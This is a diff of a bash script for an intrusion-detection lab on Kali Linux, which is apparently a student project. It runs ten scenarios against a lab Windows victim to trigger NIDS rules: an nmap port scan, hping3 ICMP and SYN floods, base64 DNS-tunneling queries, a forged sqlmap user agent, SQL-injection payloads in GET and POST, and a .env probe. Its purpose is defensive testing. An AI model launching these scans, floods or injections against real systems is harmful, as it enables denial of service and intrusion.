@@ -1,106 +1,87 @@
 #!/bin/bash
+# ============================================================================
+#  NIDS Attack Lab — Kali Linux Attack Script
 #
-# KỊCH BẢN THỰC NGHIỆM TẤN CÔNG NIDS — Chạy trên Kali Linux
+#  Network layout:
+#    Host  (NIDS)     : 192.168.122.1
+#    Kali  (Attacker) : 192.168.122.230
+#    Win10 (Victim)   : 192.168.122.54
 #
-# Cấu hình mạng:
-#   Host (NIDS)  : 192.168.122.1
-#   Kali (Attacker): 192.168.122.230
-#   Win10 (Victim) : 192.168.122.54
+#  Prerequisites:
+#    1. Host  — start NIDS with both rule files:
+#         sudo .venv/bin/python main.py --iface <iface> \
+#              --rules custom.rules --rules custom_test.rules --limit 0
+#    2. Win10 — run an HTTP server on port 80:
+#         python -m http.server 80
 #
-# Yêu cầu trước khi chạy:
-#   - Trên Host: khởi động NIDS với CHUỖI 2 file rules:
-#       sudo .venv/bin/python main.py --iface <iface> \
-#            --rules custom.rules --rules custom_test.rules --limit 0
-#     HOẶC gộp 2 file rules lại thành 1 rồi nạp.
-#   - Trên Win10 Victim: mở dịch vụ HTTP trên cổng 80
-#       python -m http.server 80   (hoặc Apache/IIS)
-#
-# Cần quyền root (sudo) để chạy nmap và hping3.
-# =========================================================================
+#  Requires root (sudo) for nmap and hping3.
+# ============================================================================
 
-TARGET_IP="192.168.122.54"    # Win10 Victim
-NIDS_IP="192.168.122.1"      # Host chạy NIDS
+set -euo pipefail
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+# --------------- Config ---------------
+TARGET_IP="192.168.122.54"   # Win10 Victim
+NIDS_IP="192.168.122.1"     # Host running NIDS
+ATTACKER_IP="192.168.122.230"
+DNS_RELAY="8.8.8.8"         # Relay so traffic crosses virbr0
 
-separator() {
-    echo ""
-    echo -e "${CYAN}===========================================================${NC}"
+# --------------- Colors ---------------
+R='\033[0;31m'  G='\033[0;32m'  Y='\033[1;33m'  C='\033[0;36m'
+B='\033[1;97m'  DIM='\033[2m'   RST='\033[0m'
+
+# --------------- Helpers ---------------
+hr()      { echo -e "${C}$(printf '═%.0s' {1..60})${RST}"; }
+blank()   { echo ""; }
+
+begin_scenario() {
+    # $1 = number, $2 = title, $3 = rule, $4 = description
+    blank; hr
+    echo -e " ${R}▸ Kịch bản $1${RST}  ${B}$2${RST}"
+    echo -e "   ${DIM}Luật: $3${RST}"
+    echo -e "   ${DIM}$4${RST}"
+    hr
 }
 
-wait_between() {
-    echo -e "${YELLOW}>> Đợi 5 giây trước kịch bản tiếp theo...${NC}"
+end_scenario() {
+    echo -e " ${G}✔ Kịch bản $1 hoàn tất.${RST}"
+}
+
+pause_between() {
+    echo -e " ${Y}⏳ Đợi 5 s...${RST}"
     sleep 5
 }
 
-# =========================================================================
-# Kịch bản 1: Quét cổng bằng Nmap (Port Scan Detection)
-# Luật: RULE-001 — ≥20 cổng TCP khác nhau trong 10 giây
-# =========================================================================
+# ========================  BEHAVIOR-BASED  ==================================
+
 scenario_1() {
-    separator
-    echo -e "${RED}[KB 1] Quét cổng bằng Nmap (Port Scan Detection)${NC}"
-    echo "  Luật kích hoạt: RULE-001 (≥20 unique TCP ports / 10s)"
-    echo "  Gửi SYN scan đến 20 cổng với tốc độ nhanh (T4, --scan-delay 5ms)"
-    echo "---"
+    begin_scenario 1 "Nmap Port Scan" "RULE-001 (≥20 TCP ports / 10 s)" \
+        "SYN scan 20 ports — T4, --scan-delay 5 ms"
     sudo nmap -sS \
         -p 21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,8080,8443,8888,9090,9200 \
         --scan-delay 5ms -T4 -n --open --max-retries 0 \
         "$TARGET_IP"
-    echo -e "${GREEN}>> Kịch bản 1 hoàn tất.${NC}"
+    end_scenario 1
 }
 
-# =========================================================================
-# Kịch bản 2: ICMP Ping Flood DoS Attack
-# Luật: RULE-002 — ≥100 gói ICMP request (type 8/13/17) trong 10 giây
-# =========================================================================
 scenario_2() {
-    separator
-    echo -e "${RED}[KB 2] ICMP Ping Flood DoS Attack${NC}"
-    echo "  Luật kích hoạt: RULE-002 (≥100 ICMP request / 10s)"
-    echo "  Gửi 120 gói ICMP Echo Request, khoảng cách 50ms (u50000)"
-    echo "---"
+    begin_scenario 2 "ICMP Ping Flood" "RULE-002 (≥100 ICMP req / 10 s)" \
+        "120 Echo Requests, interval 50 ms"
     sudo hping3 --icmp -c 120 -i u50000 "$TARGET_IP"
-    echo -e "${GREEN}>> Kịch bản 2 hoàn tất.${NC}"
+    end_scenario 2
 }
 
-# =========================================================================
-# Kịch bản 3: TCP SYN Flood Attack
-# Luật: RULE-003 — ≥100 gói SYN (không ACK) cùng src:dst:port trong 10s
-# =========================================================================
 scenario_3() {
-    separator
-    echo -e "${RED}[KB 3] TCP SYN Flood Attack${NC}"
-    echo "  Luật kích hoạt: RULE-003 (≥100 SYN packets / 10s → port 80)"
-    echo "  Gửi 120 gói TCP SYN đến cổng 80, khoảng cách 50ms (u50000)"
-    echo "---"
+    begin_scenario 3 "TCP SYN Flood" "RULE-003 (≥100 SYN / 10 s → port 80)" \
+        "120 SYN packets to port 80, interval 50 ms"
     sudo hping3 -S -p 80 -c 120 -i u50000 "$TARGET_IP"
-    echo -e "${GREEN}>> Kịch bản 3 hoàn tất.${NC}"
+    end_scenario 3
 }
 
-# =========================================================================
-# Kịch bản 4: DNS Tunneling Anomaly Detection
-# Luật: RULE-004 — ≥5 DNS queries bất thường trong 30 giây
-#   Điều kiện bất thường (cần đạt ≥1 trong 3):
-#     - Tổng độ dài query name ≥ 100 ký tự
-#     - Nhãn phụ (label) dài nhất ≥ 45 ký tự
-#     - Entropy Shannon của label ≥ 3.8 (với label ≥ 24 ký tự)
-#
-#   → Dùng chuỗi base64 dài ≥52 ký tự cho mỗi nhãn để vượt ngưỡng.
-# =========================================================================
 scenario_4() {
-    separator
-    echo -e "${RED}[KB 4] DNS Tunneling Anomaly Detection${NC}"
-    echo "  Luật kích hoạt: RULE-004 (≥5 suspicious DNS queries / 30s)"
-    echo "  Gửi 7 truy vấn DNS với nhãn phụ dài (≤63 chars), entropy cao"
-    echo "---"
-    # Label phải ≤63 ký tự (giới hạn giao thức DNS), nhưng ≥45 ký tự (ngưỡng NIDS)
-    # Các label 54-56 ký tự đã kiểm chứng hoạt động trong kali_attack_demo.sh
-    # Gửi qua @8.8.8.8 để traffic đi qua virbr0 (interface NIDS đang sniff)
+    begin_scenario 4 "DNS Tunneling" "RULE-004 (≥5 suspicious queries / 30 s)" \
+        "7 queries with high-entropy labels (45–56 chars each)"
+
+    # Labels: 45–63 chars, base64 strings → high entropy, long subdomain
     local labels=(
         "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
         "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n"
@@ -110,162 +91,124 @@ scenario_4() {
         "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA"
         "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"
     )
-    for label in "${labels[@]}"; do
-        echo "  >> dig ${label:0:30}...tunnel.example.com"
-        dig +short +time=1 +tries=1 "${label}.tunnel.example.com" @8.8.8.8 2>/dev/null
+    for lbl in "${labels[@]}"; do
+        echo -e "   ${DIM}dig ${lbl:0:30}…tunnel.example.com${RST}"
+        dig +short +time=1 +tries=1 "${lbl}.tunnel.example.com" @"$DNS_RELAY" 2>/dev/null
         sleep 0.4
     done
-    echo -e "${GREEN}>> Kịch bản 4 hoàn tất.${NC}"
+    end_scenario 4
 }
 
-# =========================================================================
-# Kịch bản 5: Luật chữ ký DNS tùy chỉnh (Custom DNS Signature Matching)
-# Luật: SID 1000101 — dns.query chứa "example.com"
-# Lưu ý: Luật nằm trong file custom_test.rules
-# =========================================================================
+# ========================  SIGNATURE-BASED  =================================
+
 scenario_5() {
-    separator
-    echo -e "${RED}[KB 5] Custom DNS Signature Matching${NC}"
-    echo "  Luật kích hoạt: SID 1000101 (dns.query chứa 'example.com')"
-    echo "---"
-    # Gửi qua @8.8.8.8 để traffic đi qua virbr0 (interface NIDS sniff)
-    dig example.com @8.8.8.8
-    echo -e "${GREEN}>> Kịch bản 5 hoàn tất.${NC}"
+    begin_scenario 5 "Custom DNS Signature" "SID 1000101 (dns.query ∋ 'example.com')" \
+        "Single dig query for example.com"
+    dig example.com @"$DNS_RELAY"
+    end_scenario 5
 }
 
-# =========================================================================
-# Kịch bản 6: sqlmap User-Agent Scan
-# Luật: SID 1000002 — http.user_agent chứa "sqlmap"
-# =========================================================================
 scenario_6() {
-    separator
-    echo -e "${RED}[KB 6] sqlmap Scanner User-Agent Detected${NC}"
-    echo "  Luật kích hoạt: SID 1000002 (http.user_agent chứa 'sqlmap')"
-    echo "---"
-    curl -v -A "sqlmap/1.8.2#stable (https://sqlmap.org)" \
-        "http://$TARGET_IP/" 2>&1 | head -20
-    echo ""
-    echo -e "${GREEN}>> Kịch bản 6 hoàn tất.${NC}"
+    begin_scenario 6 "sqlmap User-Agent" "SID 1000002 (http.user_agent ∋ 'sqlmap')" \
+        "HTTP GET with forged sqlmap UA string"
+    curl -s -A "sqlmap/1.8.2#stable (https://sqlmap.org)" \
+        "http://$TARGET_IP/" | head -20
+    end_scenario 6
 }
 
-# =========================================================================
-# Kịch bản 7: SQL Injection GET URI
-# Luật: SID 1000001 — http.uri chứa "' OR '1'='1"
-# NIDS tự động URL-decode trước khi so khớp.
-# =========================================================================
 scenario_7() {
-    separator
-    echo -e "${RED}[KB 7] SQL Injection trong URL Parameters (GET)${NC}"
-    echo "  Luật kích hoạt: SID 1000001 (http.uri chứa SQL injection pattern)"
-    echo "---"
-    curl -v "http://$TARGET_IP/index.php?id=%27%20OR%20%271%27%3D%271" 2>&1 | head -20
-    echo ""
-    echo -e "${GREEN}>> Kịch bản 7 hoàn tất.${NC}"
+    begin_scenario 7 "SQL Injection — GET" "SID 1000001 (http.uri ∋ SQLi pattern)" \
+        "URL-encoded ' OR '1'='1 in query string"
+    curl -s "http://$TARGET_IP/index.php?id=%27%20OR%20%271%27%3D%271" | head -20
+    end_scenario 7
 }
 
-# =========================================================================
-# Kịch bản 8: SQL Injection POST Body
-# Luật: SID 1000003 — pkt_data (payload) chứa "' OR '1'='1"
-# =========================================================================
 scenario_8() {
-    separator
-    echo -e "${RED}[KB 8] SQL Injection trong POST Request Body${NC}"
-    echo "  Luật kích hoạt: SID 1000003 (pkt_data chứa SQL injection pattern)"
-    echo "---"
-    curl -v -X POST "http://$TARGET_IP/login" \
-        --data "username=admin&password=' OR '1'='1" 2>&1 | head -20
-    echo ""
-    echo -e "${GREEN}>> Kịch bản 8 hoàn tất.${NC}"
+    begin_scenario 8 "SQL Injection — POST" "SID 1000003 (pkt_data ∋ SQLi pattern)" \
+        "POST body with ' OR '1'='1"
+    curl -s -X POST "http://$TARGET_IP/login" \
+        --data "username=admin&password=' OR '1'='1" | head -20
+    end_scenario 8
 }
 
-# =========================================================================
-# Kịch bản 9: Brute Force Detection (Repeated Web Access)
-# Luật: SID 900004 — detection_filter: ≥5 lần khớp "GET" từ cùng IP / 10s
-# Gửi 10 yêu cầu GET liên tục để chắc chắn vượt ngưỡng.
-# =========================================================================
 scenario_9() {
-    separator
-    echo -e "${RED}[KB 9] Brute Force Detection (Repeated Web Access)${NC}"
-    echo "  Luật kích hoạt: SID 900004 (detection_filter: ≥5 GET / 10s)"
-    echo "  Gửi 10 yêu cầu GET liên tục..."
-    echo "---"
+    begin_scenario 9 "Brute Force Detection" "SID 900004 (detection_filter: ≥5 GET / 10 s)" \
+        "10 rapid-fire GET requests"
     for i in $(seq 1 10); do
-        echo "  >> Request #$i"
-        curl -s "http://$TARGET_IP/" -o /dev/null -w "    HTTP %{http_code}\n"
+        printf "   request #%-2d → " "$i"
+        curl -s "http://$TARGET_IP/" -o /dev/null -w "HTTP %{http_code}\n"
         sleep 0.3
     done
-    echo -e "${GREEN}>> Kịch bản 9 hoàn tất.${NC}"
+    end_scenario 9
 }
 
-# =========================================================================
-# Kịch bản 10: .env Configuration File Access
-# Luật: SID 1000005 — http.uri chứa ".env"
-# =========================================================================
 scenario_10() {
-    separator
-    echo -e "${RED}[KB 10] Khai thác cấu hình nhạy cảm (.env File Access)${NC}"
-    echo "  Luật kích hoạt: SID 1000005 (http.uri chứa '.env')"
-    echo "---"
-    curl -v "http://$TARGET_IP/.env" 2>&1 | head -20
-    echo ""
-    echo -e "${GREEN}>> Kịch bản 10 hoàn tất.${NC}"
+    begin_scenario 10 ".env File Access" "SID 1000005 (http.uri ∋ '.env')" \
+        "GET /.env — sensitive config probe"
+    curl -s "http://$TARGET_IP/.env" | head -20
+    end_scenario 10
 }
 
-# =========================================================================
-# MENU
-# =========================================================================
+# ========================  MENU  ============================================
+
 show_menu() {
-    echo ""
-    echo -e "${CYAN}===========================================================${NC}"
-    echo -e "${CYAN}    KỊCH BẢN THỰC NGHIỆM TẤN CÔNG NIDS (KALI LINUX)      ${NC}"
-    echo -e "${CYAN}===========================================================${NC}"
-    echo -e "  Host (NIDS)   : ${GREEN}$NIDS_IP${NC}"
-    echo -e "  Kali (Attacker): ${RED}192.168.122.230${NC}"
-    echo -e "  Victim (Win10) : ${RED}$TARGET_IP${NC}"
-    echo -e "${CYAN}-----------------------------------------------------------${NC}"
-    echo ""
-    echo "  --- Nhóm 1: Phát hiện dựa trên Hành vi (Behavior) ---"
-    echo "  [1] Quét cổng Nmap (RULE-001 Port Scan)"
-    echo "  [2] ICMP Ping Flood (RULE-002)"
-    echo "  [3] TCP SYN Flood  (RULE-003)"
-    echo "  [4] DNS Tunneling  (RULE-004)"
-    echo ""
-    echo "  --- Nhóm 2: Phát hiện dựa trên Chữ ký (Signature) ---"
-    echo "  [5] Custom DNS Signature   (SID 1000101)"
-    echo "  [6] sqlmap User-Agent Scan (SID 1000002)"
-    echo "  [7] SQL Injection GET URI  (SID 1000001)"
-    echo "  [8] SQL Injection POST Body(SID 1000003)"
-    echo "  [9] Brute Force Detection  (SID 900004)"
-    echo "  [10] .env File Access      (SID 1000005)"
-    echo ""
-    echo -e "  ${YELLOW}[A] Chạy tất cả 10 kịch bản tuần tự${NC}"
-    echo "  [0] Thoát"
-    echo ""
+    clear 2>/dev/null || true
+    blank; hr
+    echo -e "  ${B}NIDS ATTACK LAB — KALI LINUX${RST}"
+    hr
+    echo -e "  NIDS     ${G}$NIDS_IP${RST}"
+    echo -e "  Attacker ${R}$ATTACKER_IP${RST}"
+    echo -e "  Victim   ${R}$TARGET_IP${RST}"
+    hr; blank
+
+    echo -e "  ${C}── Behavior-based ──${RST}"
+    echo "   1) Nmap Port Scan          (RULE-001)"
+    echo "   2) ICMP Ping Flood         (RULE-002)"
+    echo "   3) TCP SYN Flood           (RULE-003)"
+    echo "   4) DNS Tunneling           (RULE-004)"
+    blank
+    echo -e "  ${C}── Signature-based ──${RST}"
+    echo "   5) Custom DNS Signature    (SID 1000101)"
+    echo "   6) sqlmap User-Agent       (SID 1000002)"
+    echo "   7) SQL Injection GET       (SID 1000001)"
+    echo "   8) SQL Injection POST      (SID 1000003)"
+    echo "   9) Brute Force Detection   (SID 900004)"
+    echo "  10) .env File Access        (SID 1000005)"
+    blank
+    echo -e "  ${Y} A) Chạy tất cả tuần tự${RST}"
+    echo "   0) Thoát"
+    blank
 }
 
-show_menu
-read -p "Chọn kịch bản (0-10, A): " choice
-
-if [[ "$choice" == "A" || "$choice" == "a" ]]; then
-    echo ""
-    echo -e "${YELLOW}>> Bắt đầu chạy tuần tự 10 kịch bản...${NC}"
+run_all() {
+    echo -e "${Y}▸ Chạy tuần tự 10 kịch bản…${RST}"
     for i in $(seq 1 10); do
         "scenario_$i"
-        if [ "$i" -lt 10 ]; then
-            wait_between
-        fi
+        [[ $i -lt 10 ]] && pause_between
     done
-    separator
-    echo -e "${GREEN}>> ĐÃ HOÀN TẤT TẤT CẢ 10 KỊCH BẢN.${NC}"
-    echo -e "${YELLOW}>> Kiểm tra cảnh báo tại: http://$NIDS_IP:5000${NC}"
-elif [[ "$choice" =~ ^[0-9]+$ && "$choice" -ge 1 && "$choice" -le 10 ]]; then
-    "scenario_$choice"
-    separator
-    echo -e "${YELLOW}>> Kiểm tra cảnh báo tại: http://$NIDS_IP:5000${NC}"
-elif [[ "$choice" == "0" ]]; then
-    echo "Đã thoát."
-    exit 0
-else
-    echo -e "${RED}Lựa chọn không hợp lệ!${NC}"
-    exit 1
-fi
+    blank; hr
+    echo -e " ${G}✔ HOÀN TẤT TẤT CẢ 10 KỊCH BẢN${RST}"
+    echo -e " ${Y}→ Xem cảnh báo: http://$NIDS_IP:5000${RST}"
+}
+
+# ========================  MAIN  ============================================
+
+show_menu
+read -rp "Chọn (0-10 / A): " choice
+
+case "${choice,,}" in   # lowercase
+    a)
+        run_all
+        ;;
+    0)
+        echo "Thoát."; exit 0
+        ;;
+    [1-9]|10)
+        "scenario_$choice"
+        blank; hr
+        echo -e " ${Y}→ Xem cảnh báo: http://$NIDS_IP:5000${RST}"
+        ;;
+    *)
+        echo -e "${R}Lựa chọn không hợp lệ!${RST}"; exit 1
+        ;;
+esac
